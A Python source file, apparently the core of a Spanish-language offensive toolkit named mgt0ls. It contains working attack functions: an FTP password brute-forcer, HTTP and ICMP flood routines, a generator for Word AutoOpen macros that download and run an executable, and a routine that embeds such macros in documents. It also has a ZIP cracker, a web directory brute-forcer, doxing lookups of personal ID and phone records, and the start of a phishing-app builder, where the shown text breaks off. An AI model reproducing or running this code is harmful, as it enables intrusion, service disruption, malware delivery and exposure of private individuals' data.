import os
import json

try:
    with open(".root", "r", encoding="utf-8") as root_dir:
        root_json = json.load(root_dir)
        ROOT_MAX = root_json["root"]

        if "\\" in ROOT_MAX:
            ROOT_MAX = ROOT_MAX.replace("\\", "/")
        
        if "//" not in f"{ROOT_MAX}/":
            ROOT_MAX = ROOT_MAX + "/" # Cuando se use ROOT_MAX no hay que usar / porque ya lo tiene incluido

except:
    if "mgt0ls" in os.getcwd():
        print("[ERROR] setup.py Aun no ah sido ejecutado ...")
    else:
        print("[ERROR] No estas en la carpeta principal de mgt0ls ...")
    exit(0)

import sys
import time
import shutil
import codecs
import random
import base64
import asyncio
import pyzipper
import platform
import requests
from bs4 import BeautifulSoup
from tabulate import tabulate
from hashlib import md5, sha1
from strgen import StringGenerator
from googletrans import Translator
from ftplib import FTP, error_perm, error_reply, error_temp

## Libs with error in linux

SYS_GLOBAL = platform.system().lower()

if "termux" not in ROOT_MAX: # SI NO ES TERMUX
    import aspose.words as aw

###################################################################

def sht(path):   # Encargado de adaptar las rutas

    if "/" in path:
        check = os.path.join("a", "b")

        if "/" not in check: # Usa \
            path = path.replace("/", "\\")

    return path

def lang_cfg(lang):

    lang = lang.lower()
    with open(sht("assets/lang.cfg"), "r", encoding="utf-8") as verify, open(".root", "w", encoding="utf-8") as save_lang:

        verify_ = verify.read()

        if lang in verify_:
            root_json["lang"] = lang
            print(translate("[PASSED] Tu idioma se ah configurado correctamente ..."))

        else:
            print(translate("[ERROR] No tenemos tu idioma en nuestro registro ..."))

        save_lang.write(str(root_json).replace("'", '"'))

async def translate_as(text):

    try:
        trans_ = Translator()

        if "win" in SYS_GLOBAL:
            detect_ = trans_.translate(text, dest=root_json["lang"], src="es") # Espera para poder retornar
        else:
            detect_ = await trans_.translate(text, dest=root_json["lang"], src="es") # Espera para poder retornar

        return "\n"+detect_.text
        
    except Exception as err:

        print(f"[ERROR] {err}\n[AUTOCONFIG] Idioma reestablecido a: Spanish")
        root_json["lang"] = "es"
        with open(".root", "w", encoding="utf-8") as emergency_mod:
            emergency_mod.write(str(root_json).replace("'", '"'))

def translate(text):

    if root_json["lang"] == "es":
        return text
    else:
        return asyncio.run(translate_as(text)) # Ejecuta la tarea asyncrona para poder retornar

def update():

    try:
        with open("fsh.py", "r", encoding="utf-8") as check_lo:
            chek_vl = check_lo.read()
            chek_v = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/fsh.py")

            if chek_v.text != chek_vl:
                return "[UPDATE] MGT0L$ Tiene una nueva actualizacion disponible ..."
            else:
                return "[PASSED] MGT0L$ Esta actualizado a su version mas reciente ..."
            
    except Exception as err:
        print(f"[ERROR] {err}")

###################################################################

def findperson(nombre, arg): # Funciona with

    nombre = f"{nombre} /{arg.upper()}"

    def limpieza(limp):

        limp=limp.replace('{"',"")
        limp=limp.replace('"}',"")
        limp=limp.replace(",", "\n")
        
        limp=limp.replace('":"',"===>")
        limp=limp.replace(" ","=")

        limp=limp.split()

        for palabra in limp:

            if len(palabra) < 80 and '>"' not in palabra and "code" not in palabra and "matches" not in palabra and "None" not in palabra and "time" not in palabra and "message" not in palabra:

                if "dv" in palabra:
                    palabra="\n[NEXT PERSON]\n"
                
                palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")

                if "CONTENT:[]" in palabra:
                    return "[ERROR] {} NO ENCONTRADA".format(nombre).upper()
                    break
                else:
                    palabra = palabra.replace("CONTENT:",f"[COINCIDENCIA] ==> POSIBLE RUT DE {nombre}: ").split("\n")
                    return palabra[0]

                #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))


    def geo():

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }


        data= {
            
            "value":"{}".format(nombre),
            "ab":"false",

            filter:{

                "personas":"true",
                "empresas":"true",
                "lugares":"true",
                "argentina":"true",
                "bolivia":"false",
                "chile":"false",
                "colombia":"false",
                "guatemala":"false",
                "mexico":"false",
                "venezuela":"false"

                }
            
            }

        buscador=requests.post("https://www.genealog.cl/Geneanexus/search", headers=headers, data=data)

        save=open("a.txt", "w")
        save.write(buscador.text)
        save.close()

        with open("a.txt", "r") as leer:

            for line in leer:

                if '{"' in line:
                    resultados=line.replace("var result = ", "")
                    #resultados_json=json.loads(resultados)

        os.remove("a.txt")

        return limpieza(resultados)


    ##### PRINCIPAL CODE

        #nombre_temp=""
    fi_update={}

    fi={
        "personas":"true",
        "empresas":"true",
        "lugares":"true",
        "argentina":"/A",
        "bolivia":"/B",
        "chile":"/C",
        "colombia":"/C",
        "guatemala":"/G",
        "mexico":"/M",
        "venezuela":"/V"
        }
    
    if "/ALL" in nombre.upper():
        todos="true"

        nombre=nombre.replace(" /ALL", "")

        for key in fi.keys():
            
            fi_update.setdefault(key,todos)
            fi.update(fi_update)
    else:

        for key in fi.keys():

            if key != "personas" and key != "empresas" and key != "lugares":

                if fi.get(key) in nombre.upper():
                    nombre_temp=nombre.replace(fi.get(key), "")

                    fi_update.setdefault(key,"true")    # DEPENDE DEL RESULTADO SE ACTUALIZA A TRUE O FALSE
                else:
                    fi_update.setdefault(key,"false")

        fi.update(fi_update)
        nombre=nombre_temp

    data= {
    
    "value":"{}".format(nombre),
    "ab":"false","filter":fi
    
    }

    try:
        print(geo())
    except Exception as err:
        print(f"[ERROR] {err}")
        pass

def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with

    selec = selec.lower()

    def limpieza():

        if selec == "mul":

            usuarios=open(usuario)
            lec_usuarios=usuarios.read()

            if " " in lec_usuarios:
                lec_usuarios=lec_usuarios.replace(" ","\n")

            usu_save=open(".tempusu", "w")
            usu_save.write(lec_usuarios)

            usu_save.close()
            usuarios.close()

        passw=open(password)
        pass_lec=passw.read()

        if " " in pass_lec:
            pass_lec=pass_lec.replace(" ", "\n")
        
        pass_save=open(".temppass", "w")
        pass_save.write(pass_lec)

        pass_save.close()
        passw.close()

    def vector(usuario,password,ftpserver):

        try:
            with FTP(ftpserver) as conect:
                conect.login(user=usuario, passwd=password)
        #conect.login(user=usuario,passwd=password) # TimeoutError

        except TimeoutError:
            print(f"[OUT] SERVIDOR NO RESPONDE EN ->> [U]-{usuario}-[P]-{password}")
        except (error_temp, error_perm, error_reply):
            print(f"[BAD] USUARIO Y CONTRASEÑA INVALIDO ->> [U]-{usuario}-[P]-{password}")
        except:
            print("[ERR] ALGO SUCEDIO X_X")
        else:
            print(f"[GET] USUARIO Y CONTRASEÑA CORRECTOS ->> [U]-{usuario}-[P]-{password}")
            exit(0)
            

    def ataque(usuario, ftpserver):

    
        if selec == "mul": # Ataque a multiples usuarios
            with open(".temppass", "r") as  lines_pass, open(".tempusu", "r") as lines:
                for usuario in lines:
                    usuario=usuario.strip()

                    for password in lines_pass:
                        password=password.strip()
                        vector(usuario,password,ftpserver)
                    lines_pass.seek(0)

        if selec == "one": # Un solo usuario
            with open(".temppass", "r") as  lines_pass:
                for password in lines_pass:

                    password=password.strip()
                    vector(usuario,password,ftpserver)
        
        print("[ERROR] NO SE LOGRO ENCONTRAR NINGUNA COINCIDENCIA ...")
                



    ######################################################################################

    #try:
    limpieza()
    print(f"[FTP] EMPEZANDO ATAQUE EN ->> {ftpserver}")
    ataque(usuario, ftpserver)

    #except:
    #exit(0)

def httpflood(URL):

    def cookie_generator():

        global headers, cookies, cookie_pre
        AZAR=random.randint(1,10)

        cookie_pre=str(random.randint(9**100,9**101)).encode("utf-8") # (9**100.65,9**101.65)
        cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")

        #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
        headers={
            
            "User-Agent":f"{random_agents.get(AZAR)}",
            "Referer":f"https://www.{cookie_pre*BYTESEND}.com",
            "Cookie":f"{cookie_pre*BYTESEND}",
            "Authorization":f"{cookie_pre}",
            "Origin":f"{cookie_pre*BYTESEND}",
            "Cache-Control":"no-cache"

            }

        cookies={
            
            "{}".format(cookie_names.get(AZAR)):f"{cookie_pre}"

            }


    random_agents={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    cookie_names={

        1:"PHPSESSID",
        2:"JSESSIONID",
        3:"ga",
        4:"_gid",
        5:"_gat",
        6:"__cfduid",
        7:"__utmz",
        8:"cookieconsent_status",
        9:"csrftoken",
        10:"session-id"

    }

    BYTESEND=1
    status_max=200


    while True:

        try:
            while status_max == 200:
                cookie_generator()
                test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                status_max=test.status_code
                print("[FIND] BUSCANDO PESO DE PAYLOAD ->> [{}] STATUS [{}]".format(BYTESEND,status_max))
                
                if status_max != 200:
                    BYTESEND=BYTESEND-1
                    proceso=cookie_pre*BYTESEND

                    proceso=sys.getsizeof(proceso)

                    terminal=1048576/proceso

                    print(f"[SET] PAYLOAD SIZE {round(proceso/1024,2)}KB ->> [200]\n[SET] EN {round(terminal)} SOLICITUDES HAY ->> 1MB")
                    time.sleep(5)
                else:
                    BYTESEND=BYTESEND+1

        except Exception as err:
            print(f"[ERROR] {err}")
            exit(0)
        try:
            cookie_generator()
            atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
            
        except Exception as err:
            print(f"[ERROR] {err}")
            exit(0)
        else:

            if atak.status_code != 200:
                print("[SERVER OUT] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))
            else:
                print("[ATACANDO] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))

def icmpdos(ip, pack):

    pack = int(pack)

    print("ATACANDO => {} CON {}".format(ip,pack))

    if "win" in SYS_GLOBAL:
        os.system("ping -l {} -t {}".format(pack,ip))
    else:
        os.system("ping -s {} {}".format(pack,ip))

def iplocate(ip):

    def limpieza(limp):

        limp=limp.replace('": {'," [BLOCK]\n")
        limp=limp.replace("{","")
        limp=limp.replace(",","")
        limp=limp.replace('"',"")
        limp=limp.replace("}","\n")
        limp=limp.replace("  ","")
        limp=limp.replace(":","->>")
        
        return limp.upper()

    headers={

        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",

    }

    try:
        localizando=requests.get(f"https://ipinfo.io/widget/demo/{ip}", headers=headers)
    except:
        print(f"[ERROR] NO INTERNET OR BAD IP ->> {ip}")
        pass
    else:
        print(limpieza(localizando.text))

def lopiapi(numero):

    def legible(json):
        
        
        if "," in json or "}" in json:
            
            
            json=json.replace("{","")
            json=json.replace("}","")
            json=json.replace(",","\n\n")
            json=json.replace('"','')
            json=json.replace("[", "")
            json=json.replace("]", "")
            json=json.upper()
            
            return json
            
        else:
            return "\n[ERROR] Numero no encontrado...\n"

    try:
        consulta=requests.get("https://api-lipiapp.lipigas.cl/wapi/no_auth/usuarios/terminos/{}".format(numero))
        
        consulta_n=requests.get("https://api-lipiapp.lipigas.cl/wapi/clientes?telefono={}&pais=cl&segmento=1".format(numero))
                            
        print("\n"+legible(consulta.text)+"\n"+legible(consulta_n.text)+"\n")
    
    except:
        print("\n[ERROR] NO CONECTION 404\n")

def macromaker():

    def down():

        lec=macro_in_cache.replace("url_mgtols", rem)
        lec=lec.replace("archivo_mgtols", rem_2)

        escribe=open("macro.vb","w")
        escribe.write(lec)
        escribe.close()

        return "[MACRO] ===> MACRO.VB" 

        
    macro_in_cache="""
Sub AutoOpen()
    Dim url As String
    Dim destino As String
    Dim objShell As Object
    
    ' URL del archivo a descargar
    url = "url_mgtols"
    
    ' Ruta donde guardar el archivo (temporal en este caso)
    destino = Environ("TEMP") & "\\archivo_mgtols"
    
    ' Crear objeto Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar archivo
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    ' Guardar archivo y ejecutarlo si se descargo correctamente
    If http.Status = 200 Then
        Open destino For Binary As #1
        Put #1, , http.responseBody
        Close #1
        objShell.Run destino
        Set objShell = Nothing
    Else
        Set objShell = Nothing
    End If
    
End Sub
    """


    try:
        
        selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

        while selec <= 0 or selec > 3:
            selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

    except:
        pass

    else:

        if selec == 1:

            try:
                rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")
                
                while len(rem) == 0:
                    rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")

                rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")

                while len(rem_2) == 0:
                    rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")


            except:
                pass
            else:
                try:
                    print(down())
                except:
                    print("[ERROR] ALGO SALIO MAL")
                    pass
        
        if selec == 2:
            print("[OPTION] EN DESARROLLO")

def seeker(usuario): # Funciona with

    try:

        down_url = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/url_dox.txt")

        with open(".bdd", "w", encoding="utf-8") as save_dw:
            save_dw.write(down_url.text)

    except:
        
        print("[ERROR] No tienes conexion a internet ...")
        exit(0)
    

    status_codes = {

        200: "Posible Coincidencia",
        201: "Creado",
        202: "Aceptado",
        203: "Información no autorizada",
        204: "Sin contenido",
        205: "Restablecer contenido",
        206: "Contenido parcial",
        207: "Multi-estado",
        208: "Ya reportado",
        226: "IM utilizado",
        400: "Solicitud incorrecta",
        401: "No autorizado",
        402: "Pago requerido",
        403: "Prohibido",
        404: "No encontrado",
        405: "Método no permitido",
        406: "No aceptable",
        407: "Se requiere autenticación de proxy",
        408: "Tiempo de espera agotado",
        409: "Conflicto",
        410: "Gone (El recurso ya no está disponible y no lo estará nuevamente)",
        411: "Longitud requerida",
        412: "Precondición fallida",
        413: "Carga útil demasiado grande",
        414: "URI demasiado larga",
        415: "Tipo de medio no soportado",
        416: "Rango no satisfactorio",
        417: "Expectativa fallida",
        418: "Soy una tetera (código de estado de broma)",
        421: "Solicitud mal dirigida",
        422: "Entidad no procesable",
        423: "Bloqueado",
        424: "Dependencia fallida",
        425: "Demasiado pronto",
        426: "Se requiere actualización",
        428: "Requisito previo necesario",
        429: "Demasiadas solicitudes",
        431: "Campos de encabezado de solicitud demasiado grandes",
        451: "No disponible por razones legales",
        500: "Error interno del servidor",
        501: "No implementado",
        502: "Puerta de enlace incorrecta",
        503: "Servicio no disponible",
        504: "Tiempo de espera de la puerta de enlace agotado",
        505: "Versión HTTP no soportada",
        506: "La variante también negocia",
        507: "Almacenamiento insuficiente",
        508: "Bucle detectado",
        510: "No extendido",
        511: "Se requiere autenticación de red"

    }

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    headers= { # Especifica los valores necesarios para que get funcione correctamente
        
        "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '0'
        
    }

    def buscador(usuario):

        while True:
            
            print("[Tipo de busqueda] ===> [URL] A [{}]\n[Buscando en 800 <sitios>]".format(usuario))
            
            #leer=open(".bdd")
            #lectura=leer.readlines()

            #save=open("capture.txt", "w")

            with open(".bdd", "r") as lectura, open("capture.txt", "w") as save:
                
                for word in lectura:
                    
                    if "\n" in word:
                        word=word.replace("\n","")
                    
                    try:
                        word=word.replace("name_find", usuario) # Reemplaza el name_find del diccionario por el usuario
                        soli=requests.get(word, timeout=20)           
                        
                        if soli.status_code == 200 or "xbox" in word:
                            save.write("\n[URL] "+word)
                        #a=soli.status_code
                        
                        print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))

                    except KeyboardInterrupt:
                        save.close()
                        exit(0)

                    except:
                        pass
                    
            # Bloque de finalizacion
            print("\nSiguiente busqueda: [IN WEB]->>60 sec")

            time.sleep(60)
            siguiente()
            break

    def siguiente():
        print("[Tipo de busqueda] ===> [IN WEB] A [{}]\n".format(usuario))

        head_up={
            "User-Agent": "{}".format(random_usera.get(random.randint(1,10)))
            }
        
        headers.update(head_up)

        red=[]
        base="https://www.bing.com"
        busca= '/search?q="{}"'.format(usuario)

        try:
            dox=requests.get(base+busca, headers=headers)
            time.sleep(2)

        except:
            pass

        else:

            #save=open("capture.txt", "a")
            with open("capture.txt", "a") as save:

                sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
                
                for word in sopa.find_all("a"): # Busco parametros <a en sopa

                    palabra=str(word.get("href")) # Obtengo la etiqueta especifica href

                    if "https://" in palabra:
                        print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                        save.write("\n[URL] {}".format(palabra))
                    
                    if "first=" in palabra:
                        red.append(palabra)
                
                for word in red:

                    try:
                        dox=requests.get(base+word, headers=headers)
                        time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
                    except:
                        pass
                    
                    else:
                        sopa=BeautifulSoup(dox.text, "html.parser")
                        
                        for word_soup in sopa.find_all("a"):

                            palabra=str(word_soup.get("href"))

                            if "https://" in palabra:
                                print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
                                save.write("\n[URL] {}".format(palabra)) ##########################

            print("\nDatos de {} guardados en capture.txt!!".format(usuario))
            exit(0)

    buscador(usuario)

def tempmail(correo, selec):

    MAIL="https://mailnesia.com/mailbox/"
    mail_complemento="https://mailnesia.com"


    def limpieza(limp):
        
        limp=limp.replace("\n\n","\n")
        limp=limp.replace("\n\n\n\n\n\n","\n")
        limp=limp.replace("\n\n","\n")

        temp=open(".temp", "w", encoding="utf-8")
        temp.write(limp)
        temp.close()

        temp=open(".temp", encoding="utf-8")
        lectura=temp.readlines()

        temp_2=open(".temp_2", "w", encoding="utf-8")
        for line in lectura:

            if "https://" in line or "·" in line or "на русском языке" in line:
                ok=False
            else:
                temp_2.write(line)
        
        temp_2.close()
        temp.close()

        limp=open(".temp_2", encoding="utf-8")
        limp=limp.read()

        return limp


    try:
        solicitud=requests.get(MAIL+correo)
    
    except:
        pass

    else:
        push=0
        check=[]
        check_final={}
        check_str=None

        sopa=BeautifulSoup(solicitud.text, "html.parser")

        for link in sopa.find_all("a"):

            bandeja=str(link.get("href"))
            
            if correo+"/" in bandeja:
                check.append(bandeja)
        try:
            for link in check:

                if link != check_str:

                    push+=1
                    check_str=link
                    check_final.setdefault(push,mail_complemento+link)
        except:
            pass
        else:
            print("[EMAIL] {}@mailnesia.com ===> [LISTO PARA USAR] ===> [PUSH] Mensajes: [{}]".format(correo, push))

            if push > 0 and selec != None:
                
                selec = int(selec)

                get_mensaje=requests.get(check_final.get(selec))
                sopa=BeautifulSoup(get_mensaje.text, "html.parser")

                print(limpieza(sopa.get_text()))
                print("[ALTERNATIVA] ===> {}".format(check_final.get(selec)))             

def unzipper(dic, directiorio_archivo): # Funciona with

    def limpieza():

        limp=open(dic)
        esp=limp.read()

        abrir=open(".bbd", "w")

        if " " in esp:

            esp=esp.replace(" ","\n")

        
        abrir.write(esp)
        
        abrir.close()
        limp.close()

    def crack():
        with open(".bbd", "r") as linea: 
            with pyzipper.AESZipFile(directiorio_archivo, "r") as filesx:  # Cambiamos a AESZipFile para soportar cifrado avanzado
                for password in linea:
                    password = password.strip()  # Limpia espacios y saltos de línea
                    
                    try:
                        # Intenta extraer usando la contraseña
                        filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
                        print(f"[SUCCESS] Contraseña encontrada: {password}")
                        #exit(0)  # Sale de la función si la contraseña es correcta
                    except:
                        print(f"[FAIL] Contraseña incorrecta: {password}")

    try:
        limpieza()
    except:
        print("\n[ERROR] Diccionario no existente!!")
        pass
    
    try:
        crack()
    except NotImplementedError:
        print("[ERROR] Formato de compresion no soportado!!")
    except FileNotFoundError:
        print("[ERROR] Archivo dañado o no existente!!")
    except:
        pass

def webdumper(select, url, dic_path): # Funciona with

    select = select.lower()

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }


    getted = []
    extensiones_comunes = [".php", ".html", ".asp", ".aspx", ".jsp", ".cgi", ".pl"]

    def get_dic(enlace, nombre):

        try:

            dic_down = requests.get(enlace)

            archivo_dic = open(nombre, "w")
            archivo_dic.write(dic_down.text)
            archivo_dic.close()

        except:
            print("[ERROR] No tienes conexion a internet ...")

    def inicial_find(url, dic_path):

        #dict = open(dic_path, "r")
        #dict_line = dict.readlines()
        
        if f"/test_script" not in f"{url}test_script": # Chekea si tiene una / al final para los directorios
            url = url + "/"

        with open(dic_path, "r") as dict_line:

            for palabra in dict_line:

                palabra = palabra.replace("\n", "")
                url_100 = f"{url}{palabra}"

                if "//" in url_100:
                    url_100 = url_100.replace("//", "/")
                    url_100 = url_100.replace(":/", "://")
                
                headers = { # Especifica los valores necesarios para que get funcione correctamente
                    
                    "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                    
                }

                finder = requests.get(url_100, headers=headers, timeout=8)

                if finder.status_code == 200 or finder.status_code == 403:

                    if finder.status_code == 403:
                        sig = "PROTEGIDO"
                    elif finder.status_code == 200:
                        sig = "ENCONTRADO"

                    if url_100 != url and [url_100, finder.status_code, sig] not in getted:
                        getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional

                print(f"[URL] {url_100} ->> {finder.status_code}")

    def recursive_find(dic_path, tipo):

        if getted != []:

            if tipo == "path":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)
            
            elif tipo == "arch":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        print(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)


    try:

        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/path.txt", "path.txt")
        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/arch.txt", "arch.txt")

        if select == "f":
            if dic_path == None:
                dic_path = "path.txt" # Ubicacion del script base
            inicial_find(url, dic_path) # Obtiene los directorios ocultos
        elif select == "s": 
            inicial_find(url, "path.txt") # Obtiene los enlaces disponibles 

            recursive_find("path.txt", "path") # Luego intenta con los sub enlaces de esos mismos
            recursive_find("arch.txt", "arch")

        print("\n")
        
        if getted != []:
            print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
        else:
            print("[ERROR] No se han encontrado directorios ocultos ...")
            
    except KeyboardInterrupt:
        print("\n")
        print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
    except ValueError:
        print("[ERROR] Caracter no valido ...")

def wordinfect(ruta, macro):

    if "termux" not in ROOT_MAX:
        def integracion():

            # Load Word document.
            doc = aw.Document(ruta)
            leer=open(macro)

            # Create VBA project
            project = aw.vba.VbaProject()
            project.name = "MacroProject"
            doc.vba_project = project

            # Create a new module and specify a macro source code.
            module = aw.vba.VbaModule()
            module.name = "MacroModule"
            module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
            module.source_code = leer.read()

            # Add module to the VBA project.
            doc.vba_project.modules.add(module)

            # Save document.
            doc.save(ruta_save)

            try:
                ruta_save=ruta.replace(".docm","_2.docm")
                integracion()
            except:
                pass
            else:
                print("[WORD INFECTADO] ===> {}".format(ruta_save))
    
    else:
        print(translate("[ERROR] Wordinfect aun no disponible en Termux ..."))

def sc4pk(idcap, selec):

    selec = selec.lower()
    CONTADOR=0

    ver_carpeta=os.listdir(".")

    base_apk={

        "ig":"instagram",
        "fb":"facebook",
        "tw":"twitter",
        "go":"google"

    }

    def crear(selec, idcap):

        REMP=base_apk.get(selec)

        try:
            
            asset_save=open(os.path.join("Scam_2", "assets", "selec.rdp"), "w")
            asset_save.write(REMP)
            asset_save.close()

            asset_save=open(os.path.join("Scam_2", "assets", "id.rdp"), "w")
            asset_save.write(idcap)
            asset_save.close()

            """
            xml_open=codecs.open(".xml", "r", encoding="utf-8")
            xml_read=xml_open.read()
            xml_read=xml_read.replace("ID_MG", idcap).replace("SELEC_MG", REMP)
            xml_open.close()

            xml_open=open("main.xml", "wb", encoding="utf-8")
            xml_open.write(xml_read)
